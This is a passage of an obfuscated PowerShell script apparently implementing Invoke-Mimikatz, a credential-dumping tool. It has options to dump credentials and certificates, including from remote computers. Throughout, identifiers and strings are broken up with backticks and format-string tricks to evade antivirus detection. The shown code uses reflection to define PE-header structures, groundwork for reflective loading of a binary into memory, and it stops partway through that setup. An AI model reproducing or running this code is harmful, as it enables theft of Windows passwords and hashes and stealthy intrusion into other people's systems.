function iNVOke`-mi`MIkaTz
{


[CmdletBinding(dEfAulTpArAMETersETNaME={'D'+'u'+"mPC`RE`ds"})]
Param(
	[Parameter(posITion = 0)]
	[String[]]
	${cOMP`UTEr`NAMe},

    [Parameter(pARametERsetNAme = "D`UMpcRe`Ds", PosITIOn = 1)]
    [Switch]
    ${dUM`P`c`ReDS},

    [Parameter(paraMETeRseTnAME = "DU`mPc`eRTs", PosITion = 1)]
    [Switch]
    ${dumP`CE`RTS},

    [Parameter(PAraMEtERSEtName = "CusT`oMCom`maND", pOSItiOn = 1)]
    [String]
    ${cOmMA`Nd}
)

&("{1}{0}{2}{3}{4}"-f 't-','Se','S','t','rictMode') -Version 2


${rem`oTesCriPt`B`LoCK} = {
	[CmdletBinding()]
	Param(
		[Parameter(POSiTIOn = 0, mAndATory = ${T`RuE})]
		[String]
		${Pe`BYt`Es64},

        [Parameter(PosItIOn = 1, MaNDatOry = ${t`Rue})]
		[String]
		${p`Ebytes`32},
		
		[Parameter(POSItION = 2, mAnDatOrY = ${Fa`lsE})]
		[String]
		${funCRE`Tur`N`T`yPE},
				
		[Parameter(POSItIoN = 3, MANdAToRy = ${FA`LSe})]
		[Int32]
		${PR`Ocid},
		
		[Parameter(pOsITioN = 4, mandatOry = ${F`AL`Se})]
		[String]
		${P`ROcNa`mE},

        [Parameter(pOsitioN = 5, manDAToRy = ${F`AlsE})]
        [String]
        ${Ex`ear`gS}
	)
	
	
	
	
	Function gET-Wi`N3`2TYpes
	{
		${wiN32`T`yPeS} = &("{0}{1}{2}"-f'Ne','w-Obj','ect') ('Syste'+'m.O'+'bje'+'ct')

		
		
		${Do`m`AIn} = [AppDomain]::"cURR`Ent`DO`MA`In"
		${dyNa`Mi`caS`se`MBLY} = &("{3}{2}{0}{1}" -f'w-Obje','ct','e','N') ('Syste'+'m'+'.Refle'+'c'+'tion'+'.As'+'se'+'mblyN'+'a'+'me')((("{0}{1}" -f'Dynam','i')+'c'+'Ass'+'em'+'bly'))
		${AS`s`eM`BlYBuIL`Der} = ${do`mA`IN}."DEfiNeDy`NAMICAssEm`B`ly"(${DYnaMiCassE`M`B`lY}, [System.Reflection.Emit.AssemblyBuilderAccess]::"R`Un")
		${MOdU`lE`BUi`lDeR} = ${A`sSembLYb`UilD`Er}.('D'+'ef'+'ine'+'Dynami'+'cModu'+'le').Invoke(('Dy'+("{1}{0}{2}" -f 'M','namic','o')+'dul'+'e'), ${fA`l`SE})
		${COns`TrU`C`T`oRINfO} = [System.Runtime.InteropServices.MarshalAsAttribute].('GetC'+'onstructor'+'s').Invoke()[0]


		
		
		${TyPeBu`I`LdER} = ${mo`dUleb`UI`lDeR}.('Def'+'ine'+'Enum').Invoke(('M'+("{0}{1}"-f 'ac','hi')+("{1}{2}{0}" -f 'Type','n','e')), ('Pu'+("{1}{0}" -f'ic','bl')), [UInt16])
		${TYp`Ebu`ilDER}.('Def'+'ineLi'+'t'+'eral').Invoke((("{1}{0}" -f'ati','N')+'ve'), [UInt16] 0) | &("{1}{0}" -f 'ull','Out-N')
		${TyPebu`i`ld`eR}.('D'+'efin'+'eL'+'it'+'eral').Invoke(('I38'+'6'), [UInt16] 0x014c) | &("{2}{1}{0}"-f'll','Nu','Out-')
		${TyP`e`BuildeR}.('Def'+'in'+'eL'+'iteral').Invoke((("{1}{0}"-f'u','Itani')+'m'), [UInt16] 0x0200) | &("{2}{0}{1}" -f 'ul','l','Out-N')
		${TY`P`E`BUILdER}.('DefineL'+'i'+'teral').Invoke(('x'+'64'), [UInt16] 0x8664) | &("{0}{1}{2}" -f 'Out','-','Null')
		${mACH`INEt`YPe} = ${t`yPe`BU`ildEr}.('Cre'+'at'+'eType').Invoke()
		${WiN`32tY`P`eS} | &("{1}{2}{0}" -f 'r','Add-M','embe') -MemberType ('N'+'ot'+'e'+'Property') -Name ('Ma'+'chineT'+'ype') -Value ${M`AcHIn`eTyPe}

		
		${TyP`Eb`UI`LdEr} = ${MoD`ULebUiLd`er}.('Defi'+'neEn'+'um').Invoke((("{1}{0}" -f'agi','M')+("{1}{0}"-f 'Type','c')), (("{1}{0}" -f'l','Pub')+'ic'), [UInt16])
		${tY`P`e`BUiLDEr}.('De'+'fineLiter'+'al').Invoke((("{0}{1}" -f'IMA','G')+'E_N'+'T_O'+'PTI'+("{1}{0}"-f'_','ONAL')+'HD'+("{2}{1}{3}{0}"-f'GIC','M','R32_','A')), [UInt16] 0x10b) | &("{1}{0}"-f'Null','Out-')
		${tY`PE`BU`iLDEr}.('DefineLit'+'era'+'l').Invoke(('IMA'+("{0}{1}" -f'GE_N','T')+'_'+("{1}{0}"-f 'PTIO','O')+'NA'+'L_'+'H'+'D'+("{1}{0}{2}"-f'_M','R64','AGIC')), [UInt16] 0x20b) | &("{0}{2}{1}"-f'Out','Null','-')
		${ma`GI`c`TYpe} = ${t`y`PEBuildeR}.('C'+'re'+'ateType').Invoke()
		${W`IN32TYP`Es} | &("{1}{0}{3}{2}"-f '-','Add','mber','Me') -MemberType ('N'+'otePrope'+'rty') -Name ('Ma'+'gi'+'cType') -Value ${ma`g`ICtyPe}

		
		${TypeBui`L`der} = ${m`o`DUL`EBu`IlDeR}.('Def'+'i'+'ne'+'Enum').Invoke(('S'+("{2}{0}{1}" -f'bSys','t','u')+("{0}{1}"-f'e','mType')), ('Pu'+'bl'+'ic'), [UInt16])
		${tYPEBU`Il`d`er}.('DefineL'+'ite'+'ra'+'l').Invoke((("{1}{0}"-f 'AGE_SU','IM')+'BS'+'YS'+'TEM'+'_'+("{0}{1}{2}" -f 'UNKN','OW','N')), [UInt16] 0) | &("{2}{0}{1}" -f 't-N','ull','Ou')
		${TYPeBU`il`DEr}.('Defin'+'eL'+'ite'+'ral').Invoke(('IMA'+("{0}{1}"-f 'G','E_S')+("{2}{0}{1}" -f'N','AT','UBSYSTEM_')+'I'+'VE'), [UInt16] 1) | &("{1}{2}{0}" -f 'l','Out-','Nul')
		${typeb`Uil`deR}.('D'+'efineLit'+'era'+'l').Invoke(('IMA'+("{1}{0}" -f'E_S','G')+("{1}{0}{2}" -f 'S','UB','YSTEM')+'_W'+("{1}{0}" -f 'O','IND')+'W'+("{1}{0}"-f'_GU','S')+'I'), [UInt16] 2) | &("{1}{2}{0}" -f 'ull','Out-','N')
		${Ty`pe`BuIL`deR}.('Def'+'ineLiter'+'al').Invoke(('I'+'MAG'+'E_'+("{0}{1}{2}"-f'SUB','SYS','T')+("{0}{1}"-f 'EM_WIN','D')+("{1}{0}"-f'WS_','O')+'CU'+'I'), [UInt16] 3) | &("{0}{2}{1}" -f 'Out-N','l','ul')
		${T`YpeB`UilDEr}.('Def'+'ineL'+'iter'+'a'+'l').Invoke((("{1}{2}{0}"-f 'B','I','MAGE_SU')+'SYS'+'TE'+("{0}{1}"-f 'M_','PO')+'SIX'+'_CU'+'I'), [UInt16] 7) | &("{2}{1}{0}"-f'l','t-Nul','Ou')
		${typE`BUIl`D`Er}.('Defi'+'neL'+'i'+'ter'+'al').Invoke((("{0}{1}"-f 'IMA','GE')+("{1}{0}"-f'BSYSTE','_SU')+("{0}{1}"-f 'M_WIN','D')+'OW'+'S_'+("{0}{1}"-f 'CE_','GU')+'I'), [UInt16] 9) | &("{2}{0}{1}"-f 't-','Null','Ou')
		${TYpEBU`I`ld`eR}.('D'+'efineL'+'iteral').Invoke(('I'+("{1}{0}"-f 'GE_','MA')+("{2}{1}{0}"-f'BSYST','U','S')+("{1}{0}{2}"-f'FI_','EM_E','A')+'PP'+'LI'+("{1}{0}" -f 'TIO','CA')+'N'), [UInt16] 10) | &("{0}{1}{2}"-f 'Out-','Nu','ll')
		${t`YpebUiLD`eR}.('DefineLi'+'t'+'eral').Invoke((("{1}{0}{2}"-f 'A','IM','GE_SUBS')+'Y'+("{0}{1}"-f'ST','EM')+("{0}{2}{1}"-f '_E','I_B','F')+("{1}{0}{2}"-f 'OT_SER','O','VI')+'CE'+("{1}{0}" -f'VE','_DRI')+'R'), [UInt16] 11) | &("{1}{2}{0}"-f'll','Out-N','u')
		${TypEbu`iL`D`Er}.('DefineLi'+'t'+'eral').Invoke((("{2}{1}{0}" -f '_SU','MAGE','I')+'BSY'+("{1}{0}" -f 'EM_','ST')+("{2}{0}{1}" -f'I_R','UNT','EF')+("{0}{1}" -f'IME','_D')+'RI'+'VER'), [UInt16] 12) | &("{0}{1}" -f'Ou','t-Null')
		${tY`pEb`U`ILDER}.('D'+'efin'+'eLi'+'teral').Invoke(('IM'+'AG'+("{1}{0}{2}"-f 'SUBS','E_','YS')+'T'+("{1}{0}"-f 'EFI','EM_')+("{0}{1}"-f'_','ROM')), [UInt16] 13) | &("{2}{1}{0}" -f'ull','ut-N','O')
		${TyP`EB`U`ildeR}.('DefineL'+'it'+'eral').Invoke((("{0}{1}{2}" -f'IMAGE_','SU','B')+("{1}{0}"-f 'E','SYST')+'M'+'_XB'+'OX'), [UInt16] 14) | &("{1}{0}" -f'-Null','Out')
		${sUbsY`StemT`Y`Pe} = ${tyP`ebUi`l`DEr}.('C'+'rea'+'teT'+'ype').Invoke()
		${WIn`32T`yPeS} | &("{0}{2}{1}"-f 'Ad','ber','d-Mem') -MemberType ('No'+'te'+'Prop'+'erty') -Name ('Su'+'bS'+'ystemType') -Value ${SUBSysT`em`T`YPe}

		
		${TY`p`EBui`lDER} = ${MOdUl`EbUild`eR}.('D'+'e'+'fineEn'+'um').Invoke(('D'+'llC'+("{2}{3}{1}{0}"-f'ti','teris','h','arac')+'c'+("{0}{1}"-f 'sTy','pe')), ('Pu'+'bl'+'ic'), [UInt16])
		${TYpe`BUI`LdEr}.('Defin'+'eLiter'+'a'+'l').Invoke(('RES'+'_0'), [UInt16] 0x0001) | &("{2}{1}{0}" -f'l','l','Out-Nu')
		${typ`e`BUi`LdER}.('De'+'fine'+'Litera'+'l').Invoke((("{1}{0}" -f 'ES_','R')+'1'), [UInt16] 0x0002) | &("{1}{0}{2}"-f't-Nu','Ou','ll')
		${t`yPE`B`UILDer}.('De'+'fine'+'L'+'iteral').Invoke(('RES'+'_2'), [UInt16] 0x0004) | &("{0}{1}{2}"-f'Ou','t-Nul','l')
		${TYp`Ebu`I`lDEr}.('Def'+'ine'+'Literal').Invoke(('R'+("{0}{1}" -f 'ES','_3')), [UInt16] 0x0008) | &("{2}{0}{1}" -f 't-','Null','Ou')
		${t`YpEB`Uil`dEr}.('Defi'+'neLi'+'teral').Invoke(('IM'+'AGE'+'_D'+("{0}{2}{1}" -f 'LL','A','_CH')+'R'+("{0}{1}"-f 'ACT','ERIST')+'IC'+("{0}{1}"-f'S','_DY')+'NAM'+'IC'+("{1}{0}"-f 'ASE','_B')), [UInt16] 0x0040) | &("{1}{0}"-f'-Null','Out')
		${TyPebuIL`D`Er}.('Def'+'ineLit'+'eral').Invoke(('IMA'+'GE_'+("{1}{0}"-f 'LL_','D')+'CH'+'A'+'R'+("{0}{1}"-f 'ACTER','IS')+'T'+'I'+'CS'+("{1}{0}" -f 'N','_FORCE_I')+'TEG'+("{0}{1}" -f'RIT','Y')), [UInt16] 0x0080) | &("{0}{2}{1}"-f'Ou','Null','t-')
		${Typ`eBUIL`d`Er}.('DefineLite'+'r'+'al').Invoke((("{1}{0}"-f '_D','IMAGE')+'LL'+'_C'+("{1}{0}"-f'C','HARA')+'T'+'ER'+("{1}{0}"-f'C','ISTI')+'S_N'+("{1}{0}" -f 'P','X_COM')+'A'+'T'), [UInt16] 0x0100) | &("{1}{2}{0}" -f 'Null','O','ut-')
		${ty`Pe`BuildEr}.('D'+'efineLi'+'tera'+'l').Invoke(('IM'+("{1}{0}" -f'LC','AGE_DL')+'HAR'+'A'+'CTE'+'R'+("{0}{1}"-f 'IST','IC')+'S'+'_NO'+("{2}{0}{1}"-f 'OLA','T','_IS')+'ION'), [UInt16] 0x0200) | &("{2}{0}{1}" -f'-','Null','Out')
		${TYp`EBUI`L`dEr}.('Defi'+'neLiter'+'a'+'l').Invoke(('I'+'MA'+'G'+'E'+'_D'+("{1}{0}"-f 'HA','LLC')+("{1}{2}{0}"-f'RI','RACT','E')+("{1}{0}"-f'TIC','S')+("{1}{2}{0}" -f '_SEH','S','_NO')), [UInt16] 0x0400) | &("{2}{1}{0}" -f 'l','ut-Nul','O')
		${typEb`UI`l`der}.('Def'+'ine'+'Lit'+'e'+'ral').Invoke((("{2}{0}{1}"-f 'GE','_DL','IMA')+("{0}{1}{2}"-f'LCHAR','A','CT')+'E'+'R'+'IST'+("{0}{2}{1}" -f 'ICS_NO','ND','_BI')), [UInt16] 0x0800) | &("{1}{0}" -f'Null','Out-')
		${T`yp`EbuiLd`eR}.('De'+'fineLi'+'te'+'ra'+'l').Invoke(('RES'+'_4'), [UInt16] 0x1000) | &("{0}{1}"-f'Out-N','ull')
		${T`y`pEbuILDER}.('D'+'efi'+'ne'+'Literal').Invoke((("{1}{0}" -f'G','IMA')+'E_'+("{1}{0}{2}" -f'LLCH','D','ARAC')+'TER'+("{2}{4}{0}{3}{1}"-f'D','V','IS','RI','TICS_WDM_')+'ER'), [UInt16] 0x2000) | &("{0}{1}{2}" -f 'Out','-Nul','l')
		${Ty`P`EbUiLd`eR}.('Define'+'Li'+'ter'+'a'+'l').Invoke((("{0}{1}"-f'IMA','G')+("{0}{1}" -f'E','_DL')+'L'+("{1}{0}"-f'T','CHARAC')+'ER'+'IS'+'T'+'ICS'+'_'+'T'+("{1}{2}{3}{0}"-f 'RV','E','RMINAL_','SE')+("{0}{2}{1}"-f 'ER','WAR','_A')+'E'), [UInt16] 0x8000) | &("{1}{0}{2}"-f'-','Out','Null')
		${DlLCH`A`RACTEri`STI`cst`Ype} = ${Typ`eBUI`Ld`eR}.('C'+'reateT'+'ype').Invoke()
		${w`in32T`y`PeS} | &("{2}{0}{1}" -f 'd-M','ember','Ad') -MemberType ('NotePr'+'ope'+'rt'+'y') -Name ('Dl'+'l'+'Chara'+'c'+'teristicsType') -Value ${dlLc`h`A`Rac`TERIsTI`Cst`ype}

		
		
		${at`TRi`BUTES} = ('A'+("{3}{1}{0}{4}{2}{5}" -f',','toLayout','l','u',' AnsiC','ass, C')+("{0}{1}{2}" -f 'lass',',',' ')+'Pu'+'bli'+'c,'+("{1}{0}" -f 'p',' Ex')+("{1}{0}"-f 'ci','li')+("{2}{0}{1}" -f 'Layou','t, ','t')+'S'+'e'+("{1}{0}"-f 'led,','a')+("{0}{3}{2}{1}" -f ' ','reFiel','o','Bef')+("{0}{1}" -f 'd','Init'))
		${ty`pEbu`IlD`Er} = ${mOD`Ule`Bu`ILDeR}.('De'+'fin'+'eType').Invoke((("{0}{1}" -f'IMA','G')+'E'+("{0}{2}{1}"-f '_D','TA_D','A')+'I'+'R'+("{2}{1}{0}" -f 'ORY','CT','E')), ${A`T`TRiB`Utes}, [System.ValueType], 8)
		(${TYPEb`Ui`lDer}.('Defi'+'ne'+'F'+'ield').Invoke(('Vir'+("{1}{0}" -f'l','tua')+'A'+("{1}{0}"-f 'ress','dd')), [UInt32], (("{1}{0}" -f'l','Pub')+'ic'))).('S'+'e'+'tO'+'ffset').Invoke(0) | &("{1}{0}{2}" -f 't-N','Ou','ull')
		(${t`Y`PebUiLDer}.('Defin'+'eFi'+'eld').Invoke(('Siz'+'e'), [UInt32], (("{0}{1}" -f 'Pub','l')+'ic'))).('Set'+'Off'+'se'+'t').Invoke(4) | &("{1}{0}" -f 'Null','Out-')
		${IMag`E_Data_d`IREct`oRy} = ${TYp`eBuILD`er}.('Crea'+'teT'+'ype').Invoke()
		${WIN`3`2TypES} | &("{1}{0}{2}"-f'mbe','Add-Me','r') -MemberType ('Note'+'Pro'+'pert'+'y') -Name ('I'+'MA'+'G'+'E_DA'+'TA_DIRECTORY') -Value ${iM`AGe_d`A`TA_`DIrEcTorY}

		
		${A`T`Tri`BUteS} = ('A'+'u'+'toL'+'a'+("{1}{0}" -f'out,','y')+' A'+'nsi'+("{2}{0}{1}" -f ' ','Clas','Class,')+("{1}{0}{2}{3}"-f'Pu','s, ','blic, ','Sequ')+'en'+("{0}{1}"-f'tialL','a')+'y'+'o'+("{1}{0}" -f'Sea','ut, ')+("{1}{0}{2}" -f'e','led, B','f')+'ore'+("{1}{0}"-f'd','Fiel')+'Ini'+'t')
		${Ty`PebUIL`der} = ${MOd`UlEbUI`lD`eR}.('Defin'+'e'+'Type').Invoke(('I'+("{0}{1}" -f'MA','GE')+("{1}{2}{0}" -f'_HE','_FI','LE')+'AD'+'ER'), ${aT`TR`IBuTEs}, [System.ValueType], 20)
		${T`YpEBUi`L`DeR}.('Defi'+'neFiel'+'d').Invoke(('M'+'a'+("{0}{1}"-f'c','hine')), [UInt16], (("{1}{0}"-f'ubli','P')+'c')) | &("{0}{2}{1}" -f 'O','-Null','ut')
		${T`YpebUIL`dER}.('D'+'ef'+'ineField').Invoke((("{0}{1}" -f 'Num','b')+("{0}{1}"-f'erOfSe','c')+'ti'+'ons'), [UInt16], ('P'+'u'+("{1}{0}"-f 'ic','bl'))) | &("{1}{0}"-f'l','Out-Nul')
		${T`yPEb`UILdER}.('D'+'efin'+'eField').Invoke((("{1}{0}" -f'eDa','Tim')+'teS'+'tam'+'p'), [UInt32], ('Pu'+'bli'+'c')) | &("{0}{1}" -f 'Out-Nu','ll')
		${typeb`U`ildER}.('De'+'fineFie'+'ld').Invoke((("{0}{1}"-f'P','oin')+'ter'+("{1}{0}"-f 'ym','ToS')+'bo'+("{0}{1}"-f 'lT','ab')+'le'), [UInt32], ('Pu'+("{0}{1}" -f 'bl','ic'))) | &("{0}{2}{1}" -f'Ou','l','t-Nul')
		${tYpEBuI`L`d`er}.('Define'+'Fie'+'ld').Invoke(('Nu'+'m'+("{1}{0}"-f'erO','b')+'fS'+("{1}{0}"-f'ls','ymbo')), [UInt32], ('Pub'+'li'+'c')) | &("{0}{2}{1}"-f'Out','Null','-')
		${TYpEBUIL`D`Er}.('Defi'+'ne'+'Fie'+'ld').Invoke(('Siz'+("{1}{0}" -f 'fO','eO')+("{2}{1}{0}"-f'ona','i','pt')+'lH'+("{1}{0}"-f 'er','ead')), [UInt16], ('Pub'+'li'+'c')) | &("{0}{2}{1}"-f'O','ll','ut-Nu')
		${TYPE`BU`IL`der}.('Def'+'in'+'eField').Invoke(('C'+("{1}{0}" -f 'ract','ha')+("{1}{0}"-f'cs','eristi')), [UInt16], ('Pu'+("{0}{1}"-f'bli','c'))) | &("{1}{2}{0}" -f 'll','Out','-Nu')
		${IMAge`_File_hE`A`DEr} = ${TyPE`BuiLd`Er}.('C'+'r'+'eateType').Invoke()
		${WIN`32TYP`Es} | &("{0}{2}{1}"-f 'A','ember','dd-M') -MemberType ('N'+'oteProper'+'ty') -Name ('IMA'+'GE_FI'+'LE_'+'HEAD'+'ER') -Value ${IM`Age`_fI`lE_he`A`der}

		
		${atTR`ib`UT`ES} = (("{0}{2}{1}" -f 'Auto','a','L')+("{0}{1}" -f 'yout,',' ')+'Ans'+("{1}{0}" -f'las','iC')+'s'+("{0}{1}"-f ',',' Class, ')+("{0}{1}" -f'P','ubli')+'c, '+'E'+'x'+'p'+("{2}{0}{1}" -f'La','yout, ','licit')+("{1}{0}" -f'l','Sea')+("{2}{0}{1}{3}"-f' Be','fo','ed,','reF')+("{0}{2}{1}"-f'ield','nit','I'))
		${TY`pe`BUildEr} = ${MOd`UL`e`BuIlder}.('D'+'efin'+'eType').Invoke(('IM'+'AGE'+("{2}{1}{3}{0}" -f 'R6','IONAL_H','_OPT','EADE')+'4'), ${aT`TribUT`Es}, [System.ValueType], 240)
		(${tY`pEbUI`ld`er}.('DefineFi'+'e'+'ld').Invoke(('Ma'+'gic'), ${m`AgIc`TypE}, (("{1}{0}" -f 'li','Pub')+'c'))).('SetOffse'+'t').Invoke(0) | &("{0}{1}" -f 'Out','-Null')
		(${TypEbuI`l`Der}.('Defin'+'eFi'+'e'+'ld').Invoke((("{2}{1}{3}{0}" -f'ink','ajo','M','rL')+'erV'+("{0}{1}" -f'er','si')+'on'), [Byte], ('P'+("{0}{1}" -f'ub','lic')))).('Set'+'Off'+'set').Invoke(2) | &("{0}{2}{1}" -f 'Out-N','ll','u')
		(${tY`peB`UiL`DeR}.('Defi'+'neF'+'i'+'eld').Invoke(('Min'+'orL'+'in'+("{0}{1}" -f'ke','rVer')+'s'+'ion'), [Byte], ('P'+("{0}{1}"-f'ubli','c')))).('Se'+'tOf'+'fse'+'t').Invoke(3) | &("{0}{1}{2}" -f 'Out','-','Null')
		(${T`Yp`ebUILder}.('D'+'efineFie'+'ld').Invoke(('Si'+("{0}{1}" -f'z','eOf')+("{0}{1}"-f 'Co','de')), [UInt32], (("{0}{1}"-f 'Pu','bl')+'i'+'c'))).('Set'+'Offs'+'et').Invoke(4) | &("{0}{1}"-f 'Out-','Null')
		(${ty`P`eBui`ldER}.('De'+'fin'+'eField').Invoke((("{1}{2}{0}"-f'OfI','Siz','e')+'n'+'it'+'i'+("{1}{0}" -f'liz','a')+("{1}{0}" -f'dData','e')), [UInt32], ('Pu'+("{0}{1}" -f 'b','lic')))).('Set'+'O'+'ffset').Invoke(8) | &("{1}{2}{0}" -f'l','Ou','t-Nul')
		(${TYPEbu`ild`Er}.('De'+'fineFie'+'ld').Invoke((("{0}{1}" -f'Si','ze')+("{0}{1}"-f 'Of','Un')+'ini'+("{1}{0}" -f 'ali','ti')+'z'+("{1}{0}"-f 'Data','ed')), [UInt32], ('Pu'+'b'+'lic'))).('Set'+'Offset').Invoke(12) | &("{0}{2}{1}" -f 'O','ull','ut-N')
		(${T`y`PEBuILD`er}.('Defi'+'neF'+'ield').Invoke((("{1}{0}{2}"-f'dr','Ad','es')+("{2}{0}{1}"-f'OfEn','tryPoi','s')+'n'+'t'), [UInt32], ('P'+'u'+("{0}{1}"-f 'bli','c')))).('Set'+'O'+'ffset').Invoke(16) | &("{0}{1}{2}" -f 'Out-N','ul','l')
		(${ty`pEbu`i`LDer}.('De'+'fineFi'+'e'+'ld').Invoke(('B'+("{1}{0}"-f'f','aseO')+("{1}{0}"-f 'e','Cod')), [UInt32], (("{1}{0}"-f'ubli','P')+'c'))).('Se'+'tO'+'ffset').Invoke(20) | &("{2}{0}{1}" -f 'ut-N','ull','O')
		(${T`yPeb`U`ildEr}.('D'+'efi'+'neField').Invoke(('Im'+("{0}{1}" -f'ag','eB')+'ase'), [UInt64], (("{0}{1}" -f 'Publ','i')+'c'))).('Se'+'tOffs'+'et').Invoke(24) | &("{0}{1}" -f 'Out-Nu','ll')
		(${T`yPe`BuIlDEr}.('DefineF'+'i'+'eld').Invoke(('Se'+'cti'+("{2}{0}{1}"-f 'nAlignme','nt','o')), [UInt32], ('Pub'+'lic'))).('S'+'etOffs'+'e'+'t').Invoke(32) | &("{1}{0}{2}" -f 't-','Ou','Null')
		(${T`YPEbuI`lDER}.('Defi'+'ne'+'Field').Invoke(('F'+'i'+("{0}{1}" -f 'l','eAli')+("{0}{1}" -f'gnme','nt')), [UInt32], ('P'+("{0}{1}"-f 'ub','lic')))).('SetO'+'ff'+'set').Invoke(36) | &("{2}{0}{1}"-f 'u','t-Null','O')
		(${Ty`PeBui`ldeR}.('D'+'efi'+'n'+'eField').Invoke(('Ma'+("{1}{0}" -f 'orO','j')+("{1}{2}{3}{0}" -f 'Vers','perat','ingSy','stem')+'i'+'o'+'n'), [UInt16], (("{0}{1}" -f 'Pub','li')+'c'))).('S'+'etO'+'ffset').Invoke(40) | &("{0}{1}" -f'Out','-Null')
		(${t`YPeBUi`L`der}.('D'+'ef'+'ineFi'+'eld').Invoke(('M'+'ino'+'rOp'+'er'+'a'+'tin'+("{2}{0}{1}" -f'yst','emV','gS')+'e'+("{1}{0}" -f'ion','rs')), [UInt16], ('Pu'+("{1}{0}"-f'c','bli')))).('SetOf'+'f'+'set').Invoke(42) | &("{1}{0}{2}" -f 'ut-N','O','ull')
		(${T`YpebuIL`deR}.('D'+'ef'+'ineField').Invoke(('M'+'a'+'jor'+("{1}{2}{0}{3}" -f'ageVersio','I','m','n')), [UInt16], ('P'+'u'+("{0}{1}" -f'bli','c')))).('Se'+'tOf'+'fset').Invoke(44) | &("{1}{0}"-f'll','Out-Nu')
		(${T`yPeBUI`lDer}.('D'+'efineF'+'iel'+'d').Invoke(('Min'+'orI'+("{0}{1}"-f 'mage','V')+("{1}{0}" -f'n','ersio')), [UInt16], ('Pu'+("{1}{0}"-f 'lic','b')))).('SetOff'+'s'+'e'+'t').Invoke(46) | &("{0}{1}" -f 'Out-N','ull')
		(${T`YPE`BUil`Der}.('D'+'efineFi'+'eld').Invoke((("{1}{0}"-f'o','Maj')+'r'+'Su'+'bsy'+("{0}{1}" -f 's','temV')+("{0}{1}" -f 'er','si')+'on'), [UInt16], ('Pu'+'bl'+'ic'))).('SetOf'+'fse'+'t').Invoke(48) | &("{0}{2}{1}" -f'Out-N','ll','u')
		(${TyPE`B`Ui`ldeR}.('D'+'efin'+'eField').Invoke((("{1}{0}" -f 'r','Mino')+("{0}{2}{1}" -f'Subs','e','yst')+'mV'+'er'+("{0}{1}"-f'sio','n')), [UInt16], (("{0}{1}" -f'P','ubli')+'c'))).('SetO'+'ffset').Invoke(50) | &("{1}{0}{2}"-f'ul','Out-N','l')
		(${tYpE`BU`ILD`ER}.('D'+'e'+'fineFie'+'ld').Invoke(('Wi'+'n3'+("{2}{0}{1}" -f'i','onV','2Vers')+("{1}{0}" -f 'ue','al')), [UInt32], (("{0}{1}" -f 'Publ','i')+'c'))).('SetO'+'ffset').Invoke(52) | &("{2}{1}{0}"-f'll','ut-Nu','O')
		(${TypE`Bu`ilder}.('D'+'efi'+'neFiel'+'d').Invoke((("{1}{0}"-f 'eO','Siz')+'fIm'+'a'+'ge'), [UInt32], ('Pu'+("{0}{1}" -f'b','lic')))).('Set'+'O'+'f'+'fset').Invoke(56) | &("{1}{2}{0}"-f 'l','Out-Nu','l')
		(${tyP`E`Bu`IldEr}.('De'+'fineF'+'ield').Invoke(('Si'+("{1}{0}" -f 'H','zeOf')+'e'+("{0}{1}" -f 'ad','ers')), [UInt32], (("{0}{1}"-f 'P','ubli')+'c'))).('Set'+'Of'+'fset').Invoke(60) | &("{2}{0}{1}"-f 'ut-','Null','O')
		(${t`Ypeb`UiL`Der}.('De'+'fin'+'eFiel'+'d').Invoke(('Che'+("{1}{0}"-f 'Sum','ck')), [UInt32], ('Pub'+'lic'))).('Set'+'Offse'+'t').Invoke(64) | &("{2}{1}{0}" -f'l','-Nul','Out')
		(${Ty`pE`BUi`lder}.('D'+'e'+'fineFiel'+'d').Invoke((("{1}{0}"-f 'bs','Su')+'y'+("{1}{0}" -f 'em','st')), ${S`Ub`sySteMTY`PE}, (("{0}{1}"-f 'P','ubli')+'c'))).('Se'+'tOffse'+'t').Invoke(68) | &("{2}{1}{0}"-f'l','Nul','Out-')
		(${T`Ype`BuILd`eR}.('Defin'+'e'+'Field').Invoke((("{0}{1}{2}" -f'Dll','Cha','ra')+("{0}{1}"-f 'cte','r')+("{0}{1}"-f'ist','i')+'c'+'s'), ${Dl`LChAR`AcTErIsti`CSTYPE}, ('P'+("{1}{0}" -f 'ic','ubl')))).('S'+'etOff'+'s'+'et').Invoke(70) | &("{1}{2}{0}" -f 'Null','O','ut-')
		(${t`y`PEB`UiLdER}.('Defin'+'eFie'+'ld').Invoke(('Si'+("{1}{0}"-f'S','zeOf')+("{1}{0}"-f'kR','tac')+("{1}{2}{0}"-f'e','es','erv')), [UInt64], ('Pu'+'bl'+'ic'))).('Set'+'Of'+'fset').Invoke(72) | &("{1}{0}" -f'-Null','Out')
		(${t`YP`ebUiLDEr}.('Defin'+'eF'+'ield').Invoke((("{2}{0}{1}" -f'O','f','Size')+'St'+("{0}{1}" -f 'ackC','omm')+'it'), [UInt64], (("{1}{0}" -f 'l','Pub')+'ic'))).('SetOf'+'fs'+'et').Invoke(80) | &("{2}{0}{1}" -f '-','Null','Out')
		(${t`YPEBU`iLdER}.('DefineF'+'ie'+'ld').Invoke((("{0}{1}"-f'S','izeOfH')+("{1}{0}" -f 'pRe','ea')+'s'+'erv'+'e'), [UInt64], (("{1}{0}" -f'ubli','P')+'c'))).('S'+'etOffse'+'t').Invoke(88) | &("{0}{1}"-f'O','ut-Null')
		(${TYP`EbU`ILdEr}.('Define'+'F'+'ield').Invoke(('Si'+'z'+'eOf'+("{0}{1}"-f 'He','apC')+("{0}{1}"-f 'ommi','t')), [UInt64], (("{0}{1}"-f 'Pu','bli')+'c'))).('SetO'+'ffset').Invoke(96) | &("{2}{0}{1}"-f'Nu','ll','Out-')
		(${t`yPEbU`IL`der}.('D'+'efine'+'Fie'+'ld').Invoke((("{0}{1}"-f 'Load','er')+'F'+("{0}{1}" -f 'l','ags')), [UInt32], ('Pub'+'lic'))).('S'+'etOf'+'fset').Invoke(104) | &("{0}{1}"-f 'Out-','Null')
		(${TYPeb`U`ILDER}.('Defi'+'neFie'+'l'+'d').Invoke(('Nu'+("{1}{0}"-f'R','mberOf')+'va'+("{0}{1}"-f 'An','dS')+'iz'+'es'), [UInt32], ('P'+'u'+("{0}{1}"-f'bli','c')))).('S'+'e'+'tOffse'+'t').Invoke(108) | &("{0}{1}{2}"-f 'O','ut-N','ull')
		(${TY`pe`BUILDER}.('Def'+'ineF'+'ield').Invoke(('E'+("{0}{1}"-f'x','por')+("{1}{0}"-f 'l','tTab')+'e'), ${Im`Ag`E_dA`Ta`_DIrE`cToRy}, ('P'+("{1}{0}"-f'blic','u')))).('SetO'+'ffset').Invoke(112) | &("{2}{0}{1}" -f 'ut-Nu','ll','O')
